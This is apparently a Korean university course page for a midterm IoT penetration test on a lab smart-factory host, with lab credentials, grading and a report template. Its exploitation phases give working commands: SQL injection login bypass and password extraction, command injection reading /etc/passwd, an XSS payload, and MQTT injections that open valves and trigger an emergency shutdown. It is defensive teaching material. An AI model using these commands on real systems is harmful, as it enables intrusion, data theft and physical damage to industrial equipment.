# Week 08: 중간 평가 — IoT 디바이스 침투 테스트

## 학습 목표
- 1~7주차에 학습한 IoT 보안 기술을 종합 적용한다
- IoT 디바이스 침투 테스트 방법론을 실전 수행한다
- 체계적인 IoT 보안 점검 보고서를 작성한다
- MQTT, 웹 인터페이스, 프로토콜 공격을 통합 시나리오로 실습한다
- 발견한 취약점에 대한 위험도 평가와 권고안을 작성한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | IoT 서비스 (MQTT, 웹 대시보드) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh) | `ssh ccc@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:20 | 평가 안내 및 환경 확인 (Part 1) | 강의 |
| 0:20-0:40 | 침투 테스트 방법론 복습 (Part 2) | 강의 |
| 0:40-0:50 | 휴식 | - |
| 0:50-1:50 | 실전 침투 테스트 Phase 1-3 (Part 3) | 평가 |
| 1:50-2:00 | 휴식 | - |
| 2:00-2:50 | 실전 침투 테스트 Phase 4-5 (Part 4) | 평가 |
| 2:50-3:20 | 보고서 작성 (Part 5) | 평가 |
| 3:20-3:40 | 결과 리뷰 및 피드백 (Part 6) | 토론 |

---

## Part 1: 평가 안내 (20분)

### 1.1 평가 범위

| 주차 | 주제 | 평가 항목 |
|------|------|-----------|
| Week 01 | IoT 개론 | OWASP IoT Top 10, 공격 표면 |
| Week 02 | 네트워크 프로토콜 | MQTT 분석, 프로토콜 보안 |
| Week 03 | 하드웨어 인터페이스 | UART, SPI, JTAG 이해 |
| Week 04 | 펌웨어 분석 | binwalk, 민감 정보 추출 |
| Week 05 | 웹 인터페이스 공격 | SQLi, XSS, Command Injection |
| Week 06 | 무선 프로토콜 | LoRa/Zigbee 분석 |
| Week 07 | BLE 해킹 | GATT 분석, 스푸핑 |

### 1.2 평가 시나리오

가상의 스마트 팩토리 환경에서 IoT 디바이스와 서비스에 대한 종합 침투 테스트를 수행한다.

```
대상 환경: "SmartFactory IoT System"

┌─────────────────────────────────────────────┐
│               Cloud Dashboard               │
│          (http://10.20.30.80:8088)          │
├──────────────────┬──────────────────────────┤
│   MQTT Broker    │     REST API             │
│ (10.20.30.80:    │ (10.20.30.80:8088/api)  │
│  1883)           │                          │
├──────────────────┴──────────────────────────┤
│  Sensor-01  │ Camera-01  │ Actuator-01     │
│  (온도/습도) │ (IP카메라)  │ (밸브 제어)     │
└─────────────┴────────────┴─────────────────┘
```

### 1.3 채점 기준

| 항목 | 배점 | 세부 기준 |
|------|------|-----------|
| 정찰/스캔 | 20점 | 서비스 발견, 버전 정보 수집 |
| 취약점 발견 | 30점 | 각 취약점별 5점 |
| 취약점 활용 | 25점 | PoC 실행 성공 |
| 보고서 | 15점 | 체계적 문서화 |
| 보안 권고안 | 10점 | 실현 가능한 대책 |

---

## Part 2: 침투 테스트 방법론 (20분)

### 2.1 IoT 침투 테스트 5단계

```
Phase 1: 정찰 (Reconnaissance)
  → 네트워크 스캔, 서비스 열거, 버전 식별

Phase 2: 취약점 분석 (Vulnerability Analysis)
  → MQTT 인증, 웹 취약점, 프로토콜 결함 탐색

Phase 3: 취약점 활용 (Exploitation)
  → SQLi, 명령어 주입, MQTT 메시지 조작

Phase 4: 후속 공격 (Post-Exploitation)
  → 횡적 이동, 데이터 수집, 지속성 확보

Phase 5: 보고 (Reporting)
  → 취약점 목록, 위험도 평가, 권고안
```

### 2.2 IoT 점검 체크리스트

```
□ 네트워크 서비스 열거
□ MQTT 미인증 접근 확인
□ MQTT 토픽 스니핑
□ 웹 대시보드 기본 비밀번호
□ SQL Injection
□ Cross-Site Scripting
□ Command Injection
□ API 인증 확인
□ 펌웨어 민감 정보
□ 프로토콜 암호화 확인
□ BLE 서비스 열거
□ 디바이스 기본 설정
```

---

## Part 3: 실전 침투 테스트 Phase 1-3 (60분)

### 3.1 Phase 1: 정찰

```bash
# 1-1. 포트 스캔
nmap -sV -sC -p- --min-rate=1000 10.20.30.80 -oN /tmp/midterm_scan.txt

# 1-2. 서비스 배너 수집
nmap -sV -p 80,443,1883,5683,8080,8088,8883 10.20.30.80

# 1-3. MQTT 브로커 탐지
nmap -sV -p 1883 --script mqtt-subscribe 10.20.30.80

# 1-4. 웹 서버 핑거프린팅
curl -sI http://10.20.30.80:8088 | grep -iE "(server|x-powered)"
whatweb http://10.20.30.80:8088 2>/dev/null

# 1-5. 디렉터리 열거
dirb http://10.20.30.80:8088/ /usr/share/dirb/wordlists/common.txt 2>/dev/null | head -30
```

### 3.2 Phase 2: 취약점 분석

```bash
# 2-1. MQTT 미인증 접근
mosquitto_sub -h 10.20.30.80 -t "#" -v -C 20 2>/dev/null

# 2-2. MQTT 시스템 토픽
mosquitto_sub -h 10.20.30.80 -t "\$SYS/#" -v -C 10 2>/dev/null

# 2-3. 웹 기본 인증 시도
for cred in "admin:admin" "admin:admin123" "admin:password" "root:root"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  result=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    http://10.20.30.80:8088/login -d "username=$user&password=$pass" 2>/dev/null)
  echo "$cred → HTTP $result"
done

# 2-4. API 인증 확인
curl -s http://10.20.30.80:8088/api/devices 2>/dev/null | head -5

# 2-5. SQLi 탐지
curl -s "http://10.20.30.80:8088/search?q='" 2>/dev/null | head -5
```

### 3.3 Phase 3: 취약점 활용

```bash
# 3-1. MQTT 메시지 주입
mosquitto_pub -h 10.20.30.80 -t "factory/actuator/valve" \
  -m '{"action":"open","value":100}' 2>/dev/null

# 3-2. SQLi 인증 우회
curl -X POST http://10.20.30.80:8088/login \
  -d "username=admin' OR '1'='1'--&password=x" -v 2>/dev/null

# 3-3. SQLi 데이터 추출
curl -s "http://10.20.30.80:8088/search?q=' UNION SELECT 1,username,password,role,'x' FROM users--" 2>/dev/null

# 3-4. Command Injection
curl -X POST http://10.20.30.80:8088/diagnostic \
  -d "target=127.0.0.1;id;cat /etc/passwd" \
  --cookie "session=<cookie>" 2>/dev/null

# 3-5. XSS PoC
echo "XSS URL: http://10.20.30.80:8088/search?q=<script>alert('XSS')</script>"
```

---

## Part 4: 실전 침투 테스트 Phase 4-5 (50분)

### 4.1 Phase 4: 후속 공격

```bash
# 4-1. MQTT를 통한 데이터 수집
mosquitto_sub -h 10.20.30.80 -t "#" -v 2>/dev/null | tee /tmp/mqtt_data.txt &
sleep 10 && kill %1

# 4-2. 센서 데이터 조작
for i in $(seq 1 5); do
  mosquitto_pub -h 10.20.30.80 -t "factory/sensor/temp" \
    -m "{\"value\": 999, \"alert\": true}" 2>/dev/null
done

# 4-3. 악성 MQTT 토픽 생성
mosquitto_pub -h 10.20.30.80 -t "factory/command/shutdown" \
  -m '{"target":"all","action":"emergency_stop"}' 2>/dev/null

# 4-4. 서버 파일 읽기 (Command Injection 활용)
curl -X POST http://10.20.30.80:8088/diagnostic \
  -d "target=127.0.0.1;cat /tmp/iot_dashboard.db" \
  --cookie "session=<cookie>" 2>/dev/null
```

### 4.2 Phase 5: 보고서 템플릿

```bash
cat << 'EOF' > /tmp/midterm_report.md
# IoT 침투 테스트 보고서

## 1. 개요
- 대상: SmartFactory IoT System (10.20.30.80)
- 일시: $(date)
- 수행자: [이름]
- 범위: 네트워크, MQTT, 웹 대시보드, API

## 2. 발견 취약점 요약

| # | 취약점 | 위험도 | OWASP IoT |
|---|--------|--------|-----------|
| 1 | MQTT 미인증 접근 | Critical | I1 |
| 2 | 웹 대시보드 기본 비밀번호 | Critical | I1, I9 |
| 3 | SQL Injection (로그인) | Critical | I3 |
| 4 | SQL Injection (검색) | High | I3 |
| 5 | Command Injection | Critical | I3 |
| 6 | Reflected XSS | Medium | I3 |
| 7 | API 인증 부재 | High | I3 |
| 8 | 평문 MQTT 통신 | High | I7 |

## 3. 상세 분석

### 3.1 MQTT 미인증 접근 (Critical)
- 설명: 인증 없이 MQTT 브로커에 접근하여 모든 토픽을 구독/발행 가능
- PoC: mosquitto_sub -h 10.20.30.80 -t "#" -v
- 영향: 센서 데이터 도청, 액추에이터 명령 조작
- 권고: MQTT 인증 + ACL + TLS 적용

### 3.2 SQL Injection (Critical)
- 설명: 로그인 폼과 검색 기능에서 SQL Injection 가능
- PoC: admin' OR '1'='1'--
- 영향: 인증 우회, 데이터베이스 전체 접근
- 권고: Parameterized Query 사용

## 4. 권고안

| 우선순위 | 조치 | 일정 |
|----------|------|------|
| 긴급 | MQTT 인증 설정 | 즉시 |
| 긴급 | 기본 비밀번호 변경 | 즉시 |
| 높음 | SQLi 패치 (Prepared Statement) | 1주 |
| 높음 | API 인증 구현 | 1주 |
| 중간 | MQTT TLS 적용 | 2주 |
| 중간 | XSS 필터링 | 2주 |
| 낮음 | 보안 헤더 추가 | 4주 |
EOF

echo "[+] 보고서 템플릿 생성: /tmp/midterm_report.md"
```

---

## Part 5: 보고서 작성 가이드 (30분)

### 5.1 취약점 상세 기술 방법

각 취약점에 대해 다음 항목을 포함한다:

```
## 취약점 제목 [위험도: Critical/High/Medium/Low]

### 설명
취약점의 기술적 설명

### 재현 단계
1. 첫 번째 단계
2. 두 번째 단계
3. ...

### PoC (Proof of Concept)
실제 실행 가능한 명령어/코드

### 영향
비즈니스/기술적 영향도

### 권고안
구체적이고 실현 가능한 보안 조치

### OWASP IoT Top 10 매핑
관련 항목 번호 및 설명
```

### 5.2 위험도 평가 기준

| 위험도 | CVSS | 기준 |
|--------|------|------|
| Critical | 9.0-10.0 | 원격 코드 실행, 인증 우회, 물리적 피해 |
| High | 7.0-8.9 | 데이터 유출, 권한 상승 |
| Medium | 4.0-6.9 | 정보 수집, 제한적 영향 |
| Low | 0.1-3.9 | 정보 노출, 이론적 위험 |

---

## Part 6: 결과 리뷰 및 피드백 (20분)

### 6.1 주요 발견 사항 토론

- 가장 위험한 취약점과 그 이유
- 실제 환경에서의 공격 시나리오
- 방어자 관점에서의 우선순위

### 6.2 후반기 과정 안내

| 주차 | 주제 | 중간 평가 연계 |
|------|------|---------------|
| Week 09 | IP Camera 해킹 | 카메라 펌웨어/웹 인터페이스 |
| Week 10 | 스마트홈 보안 | MQTT/Zigbee 확장 |
| Week 11 | IoT 허니팟 | 방어 관점 |
| Week 12 | OT/SCADA | 산업 제어 시스템 |
| Week 13 | 자동차 보안 | CAN 버스 |
| Week 14 | 보안 가이드라인 | 체계적 보안 |
| Week 15 | 종합 평가 | 전체 통합 |

---

## 참고 자료

- OWASP IoT Testing Guide: https://owasp.org/www-project-internet-of-things/
- IoT Pentesting Methodology: https://www.iotpentestingguide.com/
- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (8주차) 학습 주제와 직접 연관된 *실제* incident:

### Data Theft (T1041) — 99.99% 의 dataset 패턴

> **출처**: WitFoo Precinct 6 / `complete-mission cluster` (anchor: `anc-a0364e702393`) · sanitized
> **시점**: 다중 (전체 99.99%)

**관찰**: Precinct 6 의 incident 10,442건 중 mo_name=Data Theft + lifecycle=complete-mission 이 99.99%. T1041 (Exfiltration over C2 Channel).

**MITRE ATT&CK**: **T1041 (Exfiltration over C2 Channel)**

**IoC**:
  - `다양한 src→dst (sanitized)`
  - `suspicion≥0.7`

**학습 포인트**:
- *가장 많이 일어나는 공격* 의 baseline — 모든 IR 시나리오의 출발점
- C2 채널 (HTTP/HTTPS/DNS) 에 데이터 mixed → 정상 트래픽 위장
- 탐지: outbound 에 데이터 흐름 모니터링 (bytes_out 분포), CTI feed 매칭
- 방어: DLP (Data Loss Prevention), egress filter, 데이터 분류·암호화


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
